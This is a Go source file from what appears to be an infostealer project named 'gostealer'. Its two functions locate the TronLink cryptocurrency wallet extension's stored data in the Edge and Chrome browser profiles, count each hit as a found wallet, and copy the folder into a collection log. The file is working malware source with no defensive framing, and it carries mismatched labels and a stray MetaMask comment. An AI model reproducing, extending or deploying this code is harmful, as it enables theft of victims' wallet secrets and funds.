package wallets

import (
	"os"
	"path"

	"github.com/4kord/gostealer/utils"
)

func CopyTronlinkEdge(browserPath, logFolderPath string) {
	tronlinkc := path.Join(browserPath, "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec")

	if _, err := os.Stat(tronlinkc); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "tronlink_edge_chromeversion\n"
	}

	//metamask chrome version

	utils.CopyFolderFiles(tronlinkc, path.Join(logFolderPath, "wallets", "tronlink_edge_chromeversion"))
}

func CopyTronlinkChrome(browserPath, logFolderPath string) {
	tronlink := path.Join(browserPath, "Default", "Local Extension Settings", "ibnejdfjmmkpcnlpebklmnkoeoihofec")

	if _, err := os.Stat(tronlink); !os.IsNotExist(err) {
		utils.WalletAmount++
		utils.FoundWallets += "tronlink_edge_chrome\n"
	}
	//________________

	utils.CopyFolderFiles(tronlink, path.Join(logFolderPath, "wallets", "tronlink_chrome"))
}
